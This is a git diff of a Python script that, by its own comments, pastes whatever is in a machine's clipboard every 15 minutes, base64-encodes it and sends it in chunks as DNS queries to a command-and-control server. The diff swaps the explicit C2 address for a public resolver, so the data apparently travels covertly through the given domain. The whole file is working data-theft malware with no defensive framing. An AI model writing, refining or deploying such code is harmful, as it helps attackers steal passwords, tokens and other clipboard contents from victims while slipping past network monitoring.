@@ -1,6 +1,6 @@
 #! python3
 # This program will paste whatever is in the clipboard every 15 minutes encapsulate
-# into DNS payload and send to C2
+# into DNS payload tobe sent to your C2
 
 import pyperclip
 import os
@@ -15,7 +15,7 @@ import argparse
 
 def pasteClipBoard():
     data = pyperclip.paste()
-    encodedData = base64.b64encode(data.encode()).decode() + '!EN!'
+    encodedData = base64.b64encode(data.encode()).decode() + '!EN'
     print('EncodedDataFromClipboard: ', encodedData)
     return encodedData
 
@@ -23,14 +23,13 @@ def pasteClipBoard():
 def parseArguments():
     parser = argparse.ArgumentParser(description='DNS Payload Clipboard Sender')
     parser.add_argument('domain', help='Domain name that will be used in DNS queries')
-    parser.add_argument('c2_address', help='IP address or hostname your C2')
     return parser.parse_args()
 
 
 # encapsulate data
 
 
-def sendPayload(encodedData, domain, c2_address):
+def sendPayload(encodedData, domain):
     try:
         chunkSize = 20
         if len(encodedData) > chunkSize:
@@ -38,7 +37,7 @@ def sendPayload(encodedData, domain, c2_address):
         else:
             chunks = [encodedData]
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        client_socket.connect((c2_address, 53))
+        client_socket.connect(('8.8.8.8', 53))
 
         # Send a DNS query for each chunk
         for chunk in chunks:
@@ -64,7 +63,7 @@ def main():
             time.sleep(15 * 60)
         else:
             payload = pasteClipBoard()
-            sendPayload(payload, args.domain, args.c2_address)
+            sendPayload(payload, args.domain)
             previousValue = currentValue
 
         time.sleep(15 * 60)
